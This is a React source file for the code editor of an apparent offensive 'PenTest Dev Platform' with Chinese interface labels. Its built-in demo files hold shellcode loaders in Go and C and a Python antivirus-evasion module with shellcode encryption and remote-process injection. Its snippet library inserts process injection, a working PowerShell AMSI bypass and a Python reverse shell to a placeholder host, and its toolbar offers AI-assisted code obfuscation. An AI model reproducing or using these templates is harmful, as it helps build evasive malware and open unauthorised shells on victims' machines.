import { useState, useRef, useEffect, useCallback } from "react";
import Editor, { type Monaco } from "@monaco-editor/react";
import { trpc } from "@/lib/trpc";
import { useApp } from "@/contexts/AppContext";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Input } from "@/components/ui/input";
import { Tabs, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { ScrollArea } from "@/components/ui/scroll-area";
import { toast } from "sonner";
import { cn } from "@/lib/utils";
import {
  FileCode, FolderOpen, Plus, X, Save, Terminal, GitBranch,
  ChevronRight, ChevronDown, File, Folder, Play, Bot,
  Code2, Layers, Package, Zap, RefreshCw, Search, Settings
} from "lucide-react";
import {
  ContextMenu, ContextMenuContent, ContextMenuItem,
  ContextMenuSeparator, ContextMenuTrigger
} from "@/components/ui/context-menu";
import {
  ResizableHandle, ResizablePanel, ResizablePanelGroup
} from "@/components/ui/resizable";

// ─── Mock file tree for demo ──────────────────────────────────────────────
const DEMO_FILES = [
  { id: 1, name: "main.go", path: "/main.go", language: "go", content: `package main

import (
	"fmt"
	"os"
	"syscall"
	"unsafe"
)

// Shellcode loader - for research purposes only
func main() {
	shellcode := []byte{
		// TODO: Add shellcode bytes
		0x90, 0x90, 0x90, // NOP sled
	}
	
	addr, err := syscall.VirtualAlloc(
		0,
		uintptr(len(shellcode)),
		syscall.MEM_COMMIT|syscall.MEM_RESERVE,
		syscall.PAGE_EXECUTE_READWRITE,
	)
	if err != nil {
		fmt.Fprintf(os.Stderr, "VirtualAlloc failed: %v\\n", err)
		os.Exit(1)
	}
	
	// Copy shellcode to allocated memory
	copy((*[1 << 30]byte)(unsafe.Pointer(addr))[:len(shellcode)], shellcode)
	
	// Execute shellcode
	syscall.Syscall(addr, 0, 0, 0, 0)
}` },
  { id: 2, name: "loader.c", path: "/loader.c", language: "c", content: `#include <windows.h>
#include <stdio.h>

// Reflective DLL Injection loader
// Target: Windows x64

unsigned char shellcode[] = {
    // Shellcode placeholder
    0x90, 0x90, 0x90
};

int main(int argc, char* argv[]) {
    LPVOID pMem = VirtualAlloc(
        NULL,
        sizeof(shellcode),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    
    if (!pMem) {
        fprintf(stderr, "VirtualAlloc failed: %lu\\n", GetLastError());
        return 1;
    }
    
    memcpy(pMem, shellcode, sizeof(shellcode));
    
    HANDLE hThread = CreateThread(
        NULL, 0,
        (LPTHREAD_START_ROUTINE)pMem,
        NULL, 0, NULL
    );
    
    WaitForSingleObject(hThread, INFINITE);
    VirtualFree(pMem, 0, MEM_RELEASE);
    return 0;
}` },
  { id: 3, name: "evasion.py", path: "/evasion.py", language: "python", content: `#!/usr/bin/env python3
"""
AV Evasion Module
Implements various techniques to bypass antivirus detection
"""

import ctypes
import struct
import base64
from typing import bytes


def xor_encrypt(data: bytes, key: bytes) -> bytes:
    """XOR encrypt shellcode with rotating key"""
    result = bytearray()
    for i, byte in enumerate(data):
        result.append(byte ^ key[i % len(key)])
    return bytes(result)


def rc4_encrypt(data: bytes, key: bytes) -> bytes:
    """RC4 encryption for shellcode obfuscation"""
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]
    
    i = j = 0
    result = []
    for byte in data:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        result.append(byte ^ S[(S[i] + S[j]) % 256])
    
    return bytes(result)


def inject_shellcode(shellcode: bytes, pid: int) -> bool:
    """Inject shellcode into target process"""
    kernel32 = ctypes.windll.kernel32
    
    hProcess = kernel32.OpenProcess(0x1F0FFF, False, pid)
    if not hProcess:
        return False
    
    pMem = kernel32.VirtualAllocEx(
        hProcess, None, len(shellcode),
        0x3000, 0x40  # MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE
    )
    
    kernel32.WriteProcessMemory(hProcess, pMem, shellcode, len(shellcode), None)
    kernel32.CreateRemoteThread(hProcess, None, 0, pMem, None, 0, None)
    
    return True` },
];

const SNIPPETS = [
  { name: "Shellcode Loader (Go)", lang: "go", code: `// Shellcode loader template\nfunc loadShellcode(sc []byte) {\n\taddr, _ := syscall.VirtualAlloc(0, uintptr(len(sc)), syscall.MEM_COMMIT, syscall.PAGE_EXECUTE_READWRITE)\n\tcopy((*[1<<30]byte)(unsafe.Pointer(addr))[:], sc)\n\tsyscall.Syscall(addr, 0, 0, 0, 0)\n}` },
  { name: "Process Injection (C)", lang: "c", code: `// Classic process injection\nHANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);\nLPVOID pMem = VirtualAllocEx(hProc, NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\nWriteProcessMemory(hProc, pMem, shellcode, size, NULL);\nCreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)pMem, NULL, 0, NULL);` },
  { name: "AMSI Bypass (PS)", lang: "powershell", code: `# AMSI Bypass\n$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)` },
  { name: "Rev Shell (Python)", lang: "python", code: `import socket,subprocess,os\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect(("LHOST",LPORT))\nos.dup2(s.fileno(),0)\nos.dup2(s.fileno(),1)\nos.dup2(s.fileno(),2)\nsubprocess.call(["/bin/sh","-i"])` },
];

// ─── Terminal Component ────────────────────────────────────────────────────
function TerminalPanel({ visible }: { visible: boolean }) {
  const [lines, setLines] = useState([
    { type: "info", text: "$ PenTest Dev Platform Terminal v1.0" },
    { type: "info", text: "$ Connected to build environment" },
    { type: "prompt", text: "$ " },
  ]);
  const [input, setInput] = useState("");
  const endRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    endRef.current?.scrollIntoView({ behavior: "smooth" });
  }, [lines]);

  const handleCommand = (cmd: string) => {
    const newLines = [...lines.slice(0, -1), { type: "cmd", text: `$ ${cmd}` }];
    if (cmd === "help") {
      newLines.push({ type: "output", text: "Available: help, clear, build, ls, pwd, whoami" });
    } else if (cmd === "clear") {
      setLines([{ type: "prompt", text: "$ " }]);
      setInput("");
      return;
    } else if (cmd === "build") {
      newLines.push({ type: "output", text: "[+] Starting build process..." });
      newLines.push({ type: "output", text: "[+] Compiling main.go..." });
      newLines.push({ type: "success", text: "[✓] Build successful: output/payload.exe (156KB)" });
    } else if (cmd === "ls") {
      newLines.push({ type: "output", text: "main.go  loader.c  evasion.py  Makefile  README.md" });
    } else if (cmd === "pwd") {
      newLines.push({ type: "output", text: "/workspace/project" });
    } else if (cmd === "whoami") {
      newLines.push({ type: "output", text: "redteam-operator" });
    } else if (cmd.trim()) {
      newLines.push({ type: "error", text: `bash: ${cmd}: command not found` });
    }
    newLines.push({ type: "prompt", text: "$ " });
    setLines(newLines);
    setInput("");
  };

  if (!visible) return null;

  return (
    <div className="h-full flex flex-col bg-[var(--editor-bg)] font-mono text-xs">
      <div className="flex items-center gap-2 px-3 py-1.5 border-b border-[var(--editor-border)] shrink-0">
        <Terminal className="w-3 h-3 text-green-400" />
        <span className="text-green-400 text-[11px]">Terminal</span>
        <div className="ml-auto flex gap-1">
          <div className="w-2.5 h-2.5 rounded-full bg-red-500" />
          <div className="w-2.5 h-2.5 rounded-full bg-yellow-500" />
          <div className="w-2.5 h-2.5 rounded-full bg-green-500" />
        </div>
      </div>
      <ScrollArea className="flex-1 p-3">
        {lines.map((line, i) => (
          <div key={i} className={cn(
            "leading-5",
            line.type === "error" ? "text-red-400" :
            line.type === "success" ? "text-green-400" :
            line.type === "info" ? "text-blue-400" :
            line.type === "cmd" ? "text-yellow-300" :
            "text-[var(--editor-fg)]"
          )}>
            {line.type === "prompt" ? (
              <div className="flex items-center">
                <span className="text-green-400">$ </span>
                <input
                  value={input}
                  onChange={e => setInput(e.target.value)}
                  onKeyDown={e => { if (e.key === "Enter") handleCommand(input); }}
                  className="flex-1 bg-transparent outline-none text-[var(--editor-fg)] caret-green-400"
                  autoFocus
                />
              </div>
            ) : (
              <span>{line.text}</span>
            )}
          </div>
        ))}
        <div ref={endRef} />
      </ScrollArea>
    </div>
  );
}

// ─── Main Editor Component ────────────────────────────────────────────────
export default function CodeEditor() {
  const { activeProjectId, setAssistantContext, setActiveModule } = useApp();
  const [openTabs, setOpenTabs] = useState(DEMO_FILES.slice(0, 2).map(f => f.id));
  const [activeTab, setActiveTab] = useState(1);
  const [showTerminal, setShowTerminal] = useState(false);
  const [showSnippets, setShowSnippets] = useState(false);
  const [showGit, setShowGit] = useState(false);
  const [fileContents, setFileContents] = useState<Record<number, string>>(
    Object.fromEntries(DEMO_FILES.map(f => [f.id, f.content]))
  );
  const [aiLoading, setAiLoading] = useState(false);
  const [selectedCode, setSelectedCode] = useState("");
  const editorRef = useRef<any>(null);
  const monacoRef = useRef<Monaco | null>(null);

  const aiOp = trpc.ai.codeOperation.useMutation({
    onSuccess: (data) => {
      toast.success("AI 操作完成");
      // Insert result as comment
      if (editorRef.current) {
        const editor = editorRef.current;
        const model = editor.getModel();
        const selection = editor.getSelection();
        if (selection) {
          editor.executeEdits("ai-operation", [{
            range: {
              startLineNumber: selection.endLineNumber + 1,
              startColumn: 1,
              endLineNumber: selection.endLineNumber + 1,
              endColumn: 1,
            },
            text: `\n/* AI Result:\n${data.content}\n*/\n`,
          }]);
        }
      }
      setAiLoading(false);
    },
    onError: () => { toast.error("AI 操作失败"); setAiLoading(false); },
  });

  const activeFile = DEMO_FILES.find(f => f.id === activeTab);

  const handleEditorMount = (editor: any, monaco: Monaco) => {
    editorRef.current = editor;
    monacoRef.current = monaco;

    // Register custom theme
    monaco.editor.defineTheme("pentest-dark", {
      base: "vs-dark",
      inherit: true,
      rules: [
        { token: "comment", foreground: "6b7280", fontStyle: "italic" },
        { token: "keyword", foreground: "a78bfa" },
        { token: "string", foreground: "86efac" },
        { token: "number", foreground: "fbbf24" },
        { token: "type", foreground: "67e8f9" },
        { token: "function", foreground: "93c5fd" },
      ],
      colors: {
        "editor.background": "#13141f",
        "editor.foreground": "#e2e8f0",
        "editor.lineHighlightBackground": "#1e2030",
        "editorLineNumber.foreground": "#374151",
        "editorLineNumber.activeForeground": "#6366f1",
        "editor.selectionBackground": "#6366f140",
        "editor.inactiveSelectionBackground": "#6366f120",
        "editorCursor.foreground": "#6366f1",
        "editorIndentGuide.background": "#1f2937",
        "editorIndentGuide.activeBackground": "#374151",
      },
    });
    monaco.editor.setTheme("pentest-dark");

    // Selection change listener
    editor.onDidChangeCursorSelection(() => {
      const selection = editor.getSelection();
      if (selection && !selection.isEmpty()) {
        const model = editor.getModel();
        if (model) {
          setSelectedCode(model.getValueInRange(selection));
        }
      } else {
        setSelectedCode("");
      }
    });
  };

  const handleAiOperation = (op: "explain" | "obfuscate" | "deobfuscate" | "rewrite" | "audit") => {
    const code = selectedCode || fileContents[activeTab] || "";
    if (!code) { toast.warning("请先选择代码"); return; }
    setAiLoading(true);
    aiOp.mutate({
      operation: op,
      code,
      language: activeFile?.language,
    });
  };

  const handleSendToAssistant = () => {
    setAssistantContext({
      fileContent: fileContents[activeTab],
      fileName: activeFile?.name,
    });
    setActiveModule("assistant");
    toast.success("已发送到 AI 助手");
  };

  const openTab = (fileId: number) => {
    if (!openTabs.includes(fileId)) {
      setOpenTabs(prev => [...prev, fileId]);
    }
    setActiveTab(fileId);
  };

  const closeTab = (fileId: number, e: React.MouseEvent) => {
    e.stopPropagation();
    const newTabs = openTabs.filter(id => id !== fileId);
    setOpenTabs(newTabs);
    if (activeTab === fileId && newTabs.length > 0) {
      setActiveTab(newTabs[newTabs.length - 1]);
    }
  };

  return (
    <div className="h-full flex flex-col bg-[var(--editor-bg)]">
      {/* Editor Toolbar */}
      <div className="flex items-center gap-1 px-3 py-1.5 border-b border-[var(--editor-border)] bg-[var(--editor-bg)] shrink-0">
        <div className="flex items-center gap-1">
          <Button
            variant="ghost" size="icon"
            className={cn("w-7 h-7 text-[var(--editor-fg)] hover:bg-[var(--editor-line)]", showSnippets && "bg-[var(--editor-line)]")}
            onClick={() => setShowSnippets(!showSnippets)}
            title="代码片段库"
          >
            <Layers className="w-3.5 h-3.5" />
          </Button>
          <Button
            variant="ghost" size="icon"
            className={cn("w-7 h-7 text-[var(--editor-fg)] hover:bg-[var(--editor-line)]", showTerminal && "bg-[var(--editor-line)]")}
            onClick={() => setShowTerminal(!showTerminal)}
            title="终端"
          >
            <Terminal className="w-3.5 h-3.5" />
          </Button>
          <Button
            variant="ghost" size="icon"
            className={cn("w-7 h-7 text-[var(--editor-fg)] hover:bg-[var(--editor-line)]", showGit && "bg-[var(--editor-line)]")}
            onClick={() => setShowGit(!showGit)}
            title="Git"
          >
            <GitBranch className="w-3.5 h-3.5" />
          </Button>
        </div>
        <div className="w-px h-4 bg-[var(--editor-border)] mx-1" />
        {/* AI Operations */}
        <div className="flex items-center gap-1">
          {[
            { label: "解释", op: "explain" as const, icon: "?" },
            { label: "混淆", op: "obfuscate" as const, icon: "~" },
            { label: "反混淆", op: "deobfuscate" as const, icon: "↑" },
            { label: "重写", op: "rewrite" as const, icon: "↺" },
            { label: "审计", op: "audit" as const, icon: "🔍" },
          ].map(item => (
            <Button
              key={item.op}
              variant="ghost" size="sm"
              className="h-6 px-2 text-[10px] text-purple-400 hover:bg-[var(--editor-line)] hover:text-purple-300 gap-1"
              onClick={() => handleAiOperation(item.op)}
              disabled={aiLoading}
            >
              <Bot className="w-3 h-3" />
              {item.label}
            </Button>
          ))}
        </div>
        <div className="ml-auto flex items-center gap-1">
          <Button
            variant="ghost" size="sm"
            className="h-6 px-2 text-[10px] text-green-400 hover:bg-[var(--editor-line)] gap-1"
            onClick={handleSendToAssistant}
          >
            <Bot className="w-3 h-3" />
            发送到助手
          </Button>
          <Button
            variant="ghost" size="sm"
            className="h-6 px-2 text-[10px] text-blue-400 hover:bg-[var(--editor-line)] gap-1"
            onClick={() => toast.success("文件已保存")}
          >
            <Save className="w-3 h-3" />
            保存
          </Button>
        </div>
      </div>

      <ResizablePanelGroup direction="horizontal" className="flex-1">
        {/* File Tree */}
        <ResizablePanel defaultSize={15} minSize={10} maxSize={25}>
          <div className="h-full flex flex-col bg-[#0f1117] border-r border-[var(--editor-border)]">
            <div className="flex items-center justify-between px-3 py-2 border-b border-[var(--editor-border)] shrink-0">
              <span className="text-[10px] text-[var(--sidebar-fg)] uppercase tracking-widest font-semibold">文件树</span>
              <Button variant="ghost" size="icon" className="w-5 h-5 text-[var(--sidebar-fg)] hover:text-white">
                <Plus className="w-3 h-3" />
              </Button>
            </div>
            <ScrollArea className="flex-1">
              <div className="p-1.5 space-y-0.5">
                {DEMO_FILES.map(file => (
                  <ContextMenu key={file.id}>
                    <ContextMenuTrigger>
                      <button
                        onClick={() => openTab(file.id)}
                        className={cn(
                          "w-full flex items-center gap-1.5 px-2 py-1 rounded text-[11px] text-left transition-colors",
                          activeTab === file.id
                            ? "bg-[var(--sidebar-active-bg)] text-white"
                            : "text-[var(--sidebar-fg)] hover:bg-[var(--sidebar-hover)] hover:text-white"
                        )}
                      >
                        <FileCode className="w-3 h-3 shrink-0 text-blue-400" />
                        <span className="truncate font-mono">{file.name}</span>
                      </button>
                    </ContextMenuTrigger>
                    <ContextMenuContent className="text-xs">
                      <ContextMenuItem onClick={() => openTab(file.id)}>打开</ContextMenuItem>
                      <ContextMenuItem onClick={() => toast.info("重命名功能即将上线")}>重命名</ContextMenuItem>
                      <ContextMenuSeparator />
                      <ContextMenuItem className="text-destructive">删除</ContextMenuItem>
                    </ContextMenuContent>
                  </ContextMenu>
                ))}
              </div>
            </ScrollArea>
          </div>
        </ResizablePanel>

        <ResizableHandle className="bg-[var(--editor-border)] w-px" />

        {/* Editor Area */}
        <ResizablePanel defaultSize={showSnippets ? 65 : 85}>
          <div className="h-full flex flex-col">
            {/* Tabs */}
            <div className="flex items-center bg-[#0f1117] border-b border-[var(--editor-border)] overflow-x-auto shrink-0">
              {openTabs.map(tabId => {
                const file = DEMO_FILES.find(f => f.id === tabId);
                if (!file) return null;
                return (
                  <div
                    key={tabId}
                    onClick={() => setActiveTab(tabId)}
                    className={cn(
                      "flex items-center gap-1.5 px-3 py-2 text-[11px] cursor-pointer border-r border-[var(--editor-border)] shrink-0 group transition-colors",
                      activeTab === tabId
                        ? "bg-[var(--editor-bg)] text-white border-t-2 border-t-[var(--primary)]"
                        : "text-[var(--sidebar-fg)] hover:bg-[var(--editor-bg)]/50"
                    )}
                  >
                    <FileCode className="w-3 h-3 text-blue-400" />
                    <span className="font-mono">{file.name}</span>
                    <button
                      onClick={(e) => closeTab(tabId, e)}
                      className="w-3.5 h-3.5 rounded-sm hover:bg-white/20 flex items-center justify-center opacity-0 group-hover:opacity-100 transition-opacity"
                    >
                      <X className="w-2.5 h-2.5" />
                    </button>
                  </div>
                );
              })}
              <button
                onClick={() => toast.info("新建文件功能即将上线")}
                className="px-2 py-2 text-[var(--sidebar-fg)] hover:text-white transition-colors shrink-0"
              >
                <Plus className="w-3.5 h-3.5" />
              </button>
            </div>

            {/* Monaco Editor */}
            <ResizablePanelGroup direction="vertical" className="flex-1">
              <ResizablePanel defaultSize={showTerminal ? 65 : 100}>
                <ContextMenu>
                  <ContextMenuTrigger className="h-full">
                    <Editor
                      height="100%"
                      language={activeFile?.language ?? "go"}
                      value={fileContents[activeTab] ?? ""}
                      onChange={(val) => setFileContents(prev => ({ ...prev, [activeTab]: val ?? "" }))}
                      onMount={handleEditorMount}
                      options={{
                        fontSize: 13,
                        fontFamily: "'JetBrains Mono', 'Fira Code', monospace",
                        fontLigatures: true,
                        minimap: { enabled: true, scale: 1 },
                        lineNumbers: "on",
                        renderWhitespace: "selection",
                        scrollBeyondLastLine: false,
                        wordWrap: "off",
                        tabSize: 4,
                        insertSpaces: false,
                        bracketPairColorization: { enabled: true },
                        guides: { bracketPairs: true, indentation: true },
                        smoothScrolling: true,
                        cursorBlinking: "phase",
                        cursorSmoothCaretAnimation: "on",
                        padding: { top: 12, bottom: 12 },
                        suggest: { showKeywords: true, showSnippets: true },
                        quickSuggestions: true,
                        parameterHints: { enabled: true },
                      }}
                    />
                  </ContextMenuTrigger>
                  <ContextMenuContent className="text-xs">
                    <ContextMenuItem onClick={() => handleAiOperation("explain")}>
                      <Bot className="w-3 h-3 mr-2 text-purple-500" /> AI 解释代码
                    </ContextMenuItem>
                    <ContextMenuItem onClick={() => handleAiOperation("rewrite")}>
                      <Bot className="w-3 h-3 mr-2 text-blue-500" /> AI 重写代码
                    </ContextMenuItem>
                    <ContextMenuItem onClick={() => handleAiOperation("obfuscate")}>
                      <Bot className="w-3 h-3 mr-2 text-amber-500" /> AI 混淆代码
                    </ContextMenuItem>
                    <ContextMenuItem onClick={() => handleAiOperation("deobfuscate")}>
                      <Bot className="w-3 h-3 mr-2 text-green-500" /> AI 反混淆
                    </ContextMenuItem>
                    <ContextMenuItem onClick={() => handleAiOperation("audit")}>
                      <Bot className="w-3 h-3 mr-2 text-red-500" /> AI 代码审计
                    </ContextMenuItem>
                    <ContextMenuSeparator />
                    <ContextMenuItem onClick={handleSendToAssistant}>
                      <Bot className="w-3 h-3 mr-2" /> 发送到 AI 助手
                    </ContextMenuItem>
                  </ContextMenuContent>
                </ContextMenu>
              </ResizablePanel>

              {showTerminal && (
                <>
                  <ResizableHandle className="bg-[var(--editor-border)] h-px" />
                  <ResizablePanel defaultSize={35} minSize={20}>
                    <TerminalPanel visible={showTerminal} />
                  </ResizablePanel>
                </>
              )}
            </ResizablePanelGroup>
          </div>
        </ResizablePanel>

        {/* Snippets Panel */}
        {showSnippets && (
          <>
            <ResizableHandle className="bg-[var(--editor-border)] w-px" />
            <ResizablePanel defaultSize={20} minSize={15} maxSize={30}>
              <div className="h-full flex flex-col bg-[#0f1117] border-l border-[var(--editor-border)]">
                <div className="flex items-center justify-between px-3 py-2 border-b border-[var(--editor-border)] shrink-0">
                  <span className="text-[10px] text-[var(--sidebar-fg)] uppercase tracking-widest font-semibold">代码片段库</span>
                  <Button
                    variant="ghost" size="icon"
                    className="w-5 h-5 text-[var(--sidebar-fg)]"
                    onClick={() => setShowSnippets(false)}
                  >
                    <X className="w-3 h-3" />
                  </Button>
                </div>
                <ScrollArea className="flex-1">
                  <div className="p-2 space-y-2">
                    {SNIPPETS.map((snippet, i) => (
                      <div
                        key={i}
                        className="rounded-md border border-[var(--editor-border)] overflow-hidden cursor-pointer hover:border-[var(--primary)] transition-colors"
                        onClick={() => {
                          if (editorRef.current) {
                            const editor = editorRef.current;
                            const selection = editor.getSelection();
                            editor.executeEdits("snippet", [{
                              range: selection,
                              text: snippet.code,
                            }]);
                            toast.success(`已插入: ${snippet.name}`);
                          }
                        }}
                      >
                        <div className="flex items-center justify-between px-2 py-1 bg-[var(--editor-line)]">
                          <span className="text-[10px] text-white font-medium truncate">{snippet.name}</span>
                          <Badge className="text-[9px] h-3.5 px-1 bg-[var(--primary)] text-white">{snippet.lang}</Badge>
                        </div>
                        <pre className="text-[9px] text-[var(--sidebar-fg)] p-2 overflow-hidden max-h-16 leading-4">
                          {snippet.code.slice(0, 120)}...
                        </pre>
                      </div>
                    ))}
                  </div>
                </ScrollArea>
              </div>
            </ResizablePanel>
          </>
        )}
      </ResizablePanelGroup>

      {/* Status Bar */}
      <div className="flex items-center gap-4 px-3 py-1 bg-[var(--primary)] text-white text-[10px] shrink-0">
        <span className="flex items-center gap-1">
          <GitBranch className="w-3 h-3" />
          main
        </span>
        <span>{activeFile?.language?.toUpperCase() ?? "GO"}</span>
        <span>UTF-8</span>
        <span>LF</span>
        {aiLoading && (
          <span className="flex items-center gap-1 ml-auto">
            <RefreshCw className="w-3 h-3 animate-spin" />
            AI 处理中...
          </span>
        )}
        <span className="ml-auto text-white/70">Ln 1, Col 1</span>
      </div>
    </div>
  );
}
